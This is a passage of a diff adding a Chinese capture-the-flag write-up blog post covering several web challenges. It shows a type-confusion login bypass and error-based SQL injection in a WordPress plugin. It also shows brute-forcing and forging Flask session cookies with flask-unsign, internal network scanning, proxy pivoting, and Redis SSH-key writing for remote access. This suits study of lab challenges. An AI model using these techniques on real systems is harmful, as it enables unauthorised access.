JpcHQ+CiAgICBjb25zb2xlLmxvZygiaGVsbG8/IikKICAgIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCJsb2dpbiIpLmFkZEV2ZW50TGlzdGVuZXIoImNsaWNrIiwgbG9naW4pOwo8L3NjcmlwdD4KPC9odG1sPg==&quot;)
+        
+class MyHandler(http.server.BaseHTTPRequestHandler):
+    def do_GET(self):
+        try:
+            if self.path == &quot;/&quot;:
+                self.send_response(200)
+                self.end_headers()
+                self.wfile.write(__page__)
+            else:
+                self.send_response(404)
+                self.end_headers()
+                self.wfile.write(b&quot;404 Not Found&quot;)
+        except Exception as e:
+            print(e)
+            self.send_response(500)
+            self.end_headers()
+            self.wfile.write(b&quot;500 Internal Server Error&quot;)
+
+    def do_POST(self):
+        try:
+            if self.path == &quot;/login&quot;:
+                body = self.rfile.read(int(self.headers.get(&quot;Content-Length&quot;)))
+                payload = json.loads(body)
+                params = json.loads(decrypt(payload[&quot;params&quot;]))
+                print(params)
+                if params.get(&quot;username&quot;) == &quot;admin&quot;:
+                    self.send_response(403)
+                    self.end_headers()
+                    self.wfile.write(b&quot;YOU CANNOT LOGIN AS ADMIN!&quot;)
+                    print(&quot;admin&quot;)
+                    return
+                if params.get(&quot;username&quot;) == params.get(&quot;password&quot;):
+                    self.send_response(403)
+                    self.end_headers()
+                    self.wfile.write(b&quot;YOU CANNOT LOGIN WITH SAME USERNAME AND PASSWORD!&quot;)
+                    print(&quot;same&quot;)
+                    return
+                hashed = gethash(params.get(&quot;username&quot;),params.get(&quot;password&quot;))
+                for k,v in hashed_users.items():
+                    if hashed == v:
+                        data = {
+                            &quot;user&quot;:k,
+                            &quot;hash&quot;:hashed,
+                            &quot;flag&quot;: FLAG if k == &quot;admin&quot; else &quot;flag{YOU_HAVE_TO_LOGIN_IN_AS_ADMIN_TO_GET_THE_FLAG}&quot;
+                        }
+                        self.send_response(200)
+                        self.end_headers()
+                        self.wfile.write(json.dumps(data).encode())
+                        print(&quot;success&quot;)
+                        return
+                self.send_response(403)
+                self.end_headers()
+                self.wfile.write(b&quot;Invalid username or password&quot;)
+            else:
+                self.send_response(404)
+                self.end_headers()
+                self.wfile.write(b&quot;404 Not Found&quot;)
+        except Exception as e:
+            print(e)
+            self.send_response(500)
+            self.end_headers()
+            self.wfile.write(b&quot;500 Internal Server Error&quot;)
+
+if __name__ == &quot;__main__&quot;:
+    server = http.server.HTTPServer((&quot;&quot;, 9999), MyHandler)
+    server.serve_forever()
+</code></pre>
+<p>将eval代码处的int_to_bytes运行即可得知出题人翻转了base64的编码和解码（即使不知道也可以直接硬解base64编码后的内容，解开即可获取index网页（用处不大））</p>
+<p>登录逻辑：</p>
+<pre><code class="python">if self.path == &quot;/login&quot;:
+                body = self.rfile.read(int(self.headers.get(&quot;Content-Length&quot;)))
+                payload = json.loads(body)
+                params = json.loads(decrypt(payload[&quot;params&quot;]))
+                print(params)
+                if params.get(&quot;username&quot;) == &quot;admin&quot;:
+                    self.send_response(403)
+                    self.end_headers()
+                    self.wfile.write(b&quot;YOU CANNOT LOGIN AS ADMIN!&quot;)
+                    print(&quot;admin&quot;)
+                    return
+                if params.get(&quot;username&quot;) == params.get(&quot;password&quot;):
+                    self.send_response(403)
+                    self.end_headers()
+                    self.wfile.write(b&quot;YOU CANNOT LOGIN WITH SAME USERNAME AND PASSWORD!&quot;)
+                    print(&quot;same&quot;)
+                    return
+                hashed = gethash(params.get(&quot;username&quot;),params.get(&quot;password&quot;))
+                for k,v in hashed_users.items():
+                    if hashed == v:
+                        data = {
+                            &quot;user&quot;:k,
+                            &quot;hash&quot;:hashed,
+                            &quot;flag&quot;: FLAG if k == &quot;admin&quot; else &quot;flag{YOU_HAVE_TO_LOGIN_IN_AS_ADMIN_TO_GET_THE_FLAG}&quot;
+                        }
+                        self.send_response(200)
+                        self.end_headers()
+                        self.wfile.write(json.dumps(data).encode())
+                        print(&quot;success&quot;)
+                        return
+                self.send_response(403)
+                self.end_headers()
+                self.wfile.write(b&quot;Invalid username or password&quot;)
+</code></pre>
+<p>在确认了json里username和password不能相同后，经过一个hash函数</p>
+<pre><code class="python">def gethash(*items):
+    c = 0
+    for item in items:
+        if item is None:
+            continue
+        c ^= int.from_bytes(hashlib.md5(f&quot;{salt}[{item}]{salt}&quot;.encode()).digest(), &quot;big&quot;) # it looks so complex! but is it safe enough?
+    return hex(c)[2:]
+</code></pre>
+<p>返回的内容消除了类型限制，因此使用不同类型的username和password即可，例如</p>
+<p><code>{&quot;username&quot;: &quot;1&quot;, &quot;password&quot;: 1}</code></p>
+<p>经过decrypt函数的五次base64后post的内容为：</p>
+<p><code>{&quot;params&quot;:&quot;VjJ4b2MxTXdNVmhVV0d4WFltMTRjRmxzVm1GTlJtUnpWR3R3VDJFeWVFVlZNV2h2VTIxR1dWcEhOVlJXZWxaRVdWVmtUbVZzVW5GVWJXeE9UVWhDZVZVeFpIZGtiRzkzVFZac1RsSkVRVGs9 &quot; }</code></p>
+<h2 id="出去旅游的心海"><a href="#出去旅游的心海" class="headerlink" title="出去旅游的心海"></a>出去旅游的心海</h2><p>本题是静态环境，环境自动重置</p>
+<p>访问题目地址，有一个假的flag和一个wordpress网站；进入网站</p>
+<p>在<code>写了个有趣的功能！</code>帖子中提示会记录访问者的信息并计入数据库</p>
+<p><em>如果你使用了科学上网会发现右边显示了你访问时使用的ip等信息</em></p>
+<p>页面审计发现js代码</p>
+<pre><code class="javascript">&lt;script&gt;
+async function submitVisitorData() {
+  try {
+    const response = await fetch(&#39;http://ip-api.com/json/&#39;);
+    const ipData = await response.json();
+
+    if (ipData.status === &#39;success&#39;) {
+      const ip = ipData.query;
+      const country = ipData.country;
+      const city = ipData.city;
+
+      const formData = new FormData();
+      formData.append(&#39;ip&#39;, ip);
+      formData.append(&#39;user-agent&#39;, navigator.userAgent);
+      
+      const dateTime = new Date().toISOString().slice(0, 19).replace(&#39;T&#39;, &#39; &#39;);
+      formData.append(&#39;time&#39;, dateTime);
+
+      const infoList = document.createElement(&#39;ul&#39;);
+      infoList.innerHTML = `&lt;li&gt;IP地址: ${ip}&lt;/li&gt;&lt;li&gt;国家: ${country}&lt;/li&gt;&lt;li&gt;城市: ${city}&lt;/li&gt;&lt;li&gt;User Agent: ${navigator.userAgent}&lt;/li&gt;&lt;li&gt;平台: ${navigator.platform}&lt;/li&gt;&lt;li&gt;操作系统语言: ${navigator.language}&lt;/li&gt;&lt;li&gt;访问时间: ${dateTime}&lt;/li&gt;`;
+      const para = document.createElement(&#39;p&#39;);
+      para.innerHTML = `记到小本本里了~`;
+      document.querySelector(&#39;.wp-container-1&#39;).appendChild(infoList);
+      document.querySelector(&#39;.wp-container-1&#39;).appendChild(para);
+
+      //记到小本本里~
+      await fetch(&#39;wp-content/plugins/visitor-logging/logger.php&#39;, {
+        method: &#39;POST&#39;,
+        body: formData
+      });
+
+    } else {
+      console.error(&#39;获取IP信息失败&#39;);
+    }
+  } catch (error) {
+    console.error(&#39;获取IP信息时出错:&#39;, error);
+  }
+}
+
+submitVisitorData();
+&lt;/script&gt;
+</code></pre>
+<p>发现提交信息到<code>wp-content/plugins/visitor-logging/logger.php</code>，访问，源码已经给出</p>
+<pre><code class="php"> &lt;?php
+/*
+Plugin Name: Visitor auto recorder
+Description: Automatically record visitor&#39;s identification, still in development, do not use in industry environment!
+Author: KoKoMi
+  Still in development! :)
+*/
+
+// 不许偷看！这些代码我还在调试呢！
+highlight_file(__FILE__);
+
+// 加载数据库配置，暂时用硬编码绝对路径
+require_once(&#39;/var/www/html/wordpress/&#39; . &#39;wp-config.php&#39;);
+
+$db_user = DB_USER; // 数据库用户名
+$db_password = DB_PASSWORD; // 数据库密码
+$db_name = DB_NAME; // 数据库名称
+$db_host = DB_HOST; // 数据库主机
+
+// 我记得可以用wp提供的global $wpdb来操作数据库，等旅游回来再研究一下
+// 这些是临时的代码
+
+$ip = $_POST[&#39;ip&#39;];
+$user_agent = $_POST[&#39;user_agent&#39;];
+$time = stripslashes($_POST[&#39;time&#39;]);
+
+$mysqli = new mysqli($db_host, $db_user, $db_password, $db_name);
+
+// 检查连接是否成功
+if ($mysqli-&gt;connect_errno) {
+    echo &#39;数据库连接失败: &#39; . $mysqli-&gt;connect_error;
+    exit();
+}
+
+$query = &quot;INSERT INTO visitor_records (ip, user_agent, time) VALUES (&#39;$ip&#39;, &#39;$user_agent&#39;, $time)&quot;;
+
+// 执行插入
+$result = mysqli_query($mysqli, $query);
+
+// 检查插入是否成功
+if ($result) {
+    echo &#39;数据插入成功&#39;;
+} else {
+    echo &#39;数据插入失败: &#39; . mysqli_error($mysqli);
+}
+
+// 关闭数据库连接
+mysqli_close($mysqli);
+
+//gpt真好用
+数据插入失败: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;)&#39; at line 1
+</code></pre>
+<p>报错注入即可获得flag</p>
+<p><del>彩蛋在题目源码里</del></p>
+<h2 id="moeworld"><a href="#moeworld" class="headerlink" title="moeworld"></a>moeworld</h2><p>by xlccccc</p>
+<p>本题需要完成前置题目 <code>出去旅游的心海</code> 才可以解开题目内容的压缩包</p>
+<h3 id="flag1"><a href="#flag1" class="headerlink" title="flag1"></a>flag1</h3><p>给了一个可访问的http服务，有登录框但是可注册，所以一般是先注册进去看看里面有什么内容</p>
+<p>发现是一个留言板服务，且在admin的留言里泄露了密钥</p>
+<pre><code class="python">app.secret_key = &quot;This-random-secretKey-you-can&#39;t-get&quot; + os.urandom(2).hex()
+</code></pre>
+<p>可能这里的密钥明文部分产生了迷惑吧❓有人觉得这个字符串是未公开的，这里是假的，其实就是爆破。。。</p>
+<p>先生成个字典</p>
+<pre><code class="python">import itertools
+characters = &#39;abcdef0123456789&#39;
+combinations = itertools.product(characters, repeat=4)
+
+all_combinations = [&#39;&#39;.join(combo) for combo in combinations]
+
+prefixed_combinations = [&#39;This-random-secretKey-you-can\&#39;t-get&#39; + combo for combo in all_combinations]
+
+with open(&#39;1.txt&#39;, &#39;w&#39;) as file:
+    for combo in prefixed_combinations:
+        file.write(combo + &#39;\n&#39;)
+</code></pre>
+<p>然后用<code>flask-unsign</code>爆破</p>
+<pre><code class="bash">flask-unsign --unsign --cookie &quot;eyJwb3dlciI6Imd1ZXN0IiwidXNlciI6IjEyMyJ9.ZTjZ6A.5y2z2ihdj3LiH2YkMjCBQm2XS9A&quot; --wordlist 1.txt --no-literal-eval
+</code></pre>
+<p><img src="/moeworld%20f27872f0066f4f15ac06538ed5b01b72/Untitled.png" alt="Untitled"></p>
+<pre><code class="python">This-random-secretKey-you-can&#39;t-get0a62
+</code></pre>
+<p>解密</p>
+<pre><code class="bash">flask-unsign --decode --cookie &#39;eyJwb3dlciI6Imd1ZXN0IiwidXNlciI6IjEyMyJ9.ZTjZ6A.5y2z2ihdj3LiH2YkMjCBQm2XS9A&#39;
+</code></pre>
+<p>伪造</p>
+<pre><code class="bash">flask-unsign --sign --cookie &quot;{&#39;power&#39;: &#39;admin&#39;, &#39;user&#39;: &#39;123&#39;}&quot; --secret &quot;This-random-secretKey-you-can&#39;t-get0a62&quot; --no-literal-eval
+# eyJwb3dlciI6ImFkbWluIiwidXNlciI6IjEyMyJ9.ZTjahQ.dGbhvXHmZKt9BUAsFYc2npiHxpw
+</code></pre>
+<p>利用伪造后的cookie访问后发现了新的留言</p>
+<p><img src="/moeworld%20f27872f0066f4f15ac06538ed5b01b72/Untitled%201.png" alt="Untitled"></p>
+<p>拿到pin码之后进console执行任意命令</p>
+<p>这里可以拿到flag1</p>
+<p><img src="/moeworld%20f27872f0066f4f15ac06538ed5b01b72/Untitled%202.png" alt="Untitled"></p>
+<h3 id="flag2"><a href="#flag2" class="headerlink" title="flag2"></a>flag2</h3><p>这里根目录下有个readme，也有提示</p>
+<p><img src="/moeworld%20f27872f0066f4f15ac06538ed5b01b72/Untitled%203.png" alt="Untitled"></p>
+<p>提示你使用fscan扫描，这里虽然没有<code>ifconfig</code>命令，但是可以<code>cat /etc/hosts</code>，也有好多人不知道这一点</p>
+<p>（一堆人扫公网服务器被阿里云警告烂了）</p>
+<p><img src="/moeworld%20f27872f0066f4f15ac06538ed5b01b72/Untitled%204.png" alt="Untitled"></p>
+<p>有两个网段很明显一个内网一个外网</p>
+<p><img src="/moeworld%20f27872f0066f4f15ac06538ed5b01b72/Untitled%205.png" alt="Untitled"></p>
+<p>扫到内网端口后就可以打开另一个压缩包了</p>
+<pre><code>password
+22-3306-6379-8080
+
+当你看到此部分，证明你正确的进行了fscan的操作得到了正确的结果
+可以看到，在本内网下还有另外两台服务器
+其中一台开启了22(ssh)和6379(redis)端口
+另一台开启了3306(mysql)端口
+还有一台正是你访问到的留言板服务
+接下来，你可能需要搭建代理，从而使你的本机能直接访问到内网的服务器
+此处可了解`nps`和`frp`，同样在/app/tools已内置了相应文件
+连接代理，推荐`proxychains`
+对于mysql服务器，你需要找到其账号密码并成功连接，在数据库中找到flag2
+对于redis服务器，你可以学习其相关的渗透技巧，从而获取到redis的权限，并进一步寻找其getshell的方式，最终得到flag3
+</code></pre>
+<p>这里也说的很明显了，搭代理然后访问数据库以及打redis</p>
+<p>tools文件夹下给出了一个frpc.ini，但是没权限编辑，是做示范了，有巨多人问我改不了怎么办…</p>
+<p>去&#x2F;tmp目录下写一个不就好了</p>
+<p>搭代理的过程就不展示了</p>
+<p>这里用proxychains连上代理</p>
+<p><img src="/moeworld%20f27872f0066f4f15ac06538ed5b01b72/Untitled%206.png" alt="Untitled"></p>
+<p>然后连接mysql</p>
+<pre><code class="bash">proxychains mysql -h 172.20.0.2 -u root -p
+</code></pre>
+<p>密码在python靶机内有（python连的mysql，所以肯定有密码）</p>
+<p><img src="/moeworld%20f27872f0066f4f15ac06538ed5b01b72/Untitled%207.png" alt="Untitled"></p>
+<p><img src="/moeworld%20f27872f0066f4f15ac06538ed5b01b72/Untitled%208.png" alt="Untitled"></p>
+<h3 id="flag3"><a href="#flag3" class="headerlink" title="flag3"></a>flag3</h3><p>开了22和6379，很明显就redis写ssh公钥rce了</p>
+<p>这里直接用<code>proxifier</code>代理<code>172.20.0.*</code>的流量</p>
+<p><img src="/moeworld%20f27872f0066f4f15ac06538ed5b01b72/Untitled%209.png" alt="Untitled"></p>
+<p>然后利用工具直接写入公钥</p>
+<p><img src="/moeworld%20f27872f0066f4f15ac06538ed5b01b72/Untitled%2010.png" alt="Untitled"></p>
+<p>然后拿着私钥ssh直接连就好了</p>
+<p><img src="/moeworld%20f27872f0066f4f15ac06538ed5b01b72/Untitled%2011.png" alt="Untitled"></p>
+<p>工具是</p>
+<p><a href="https://github.com/SafeGroceryStore/MDUT">https://github.com/SafeGroceryStore/MDUT</a></p>
+<p>利用proxychains然后手写也是一样的，也很简单</p>
+<hr>
+<p>结束    </p>
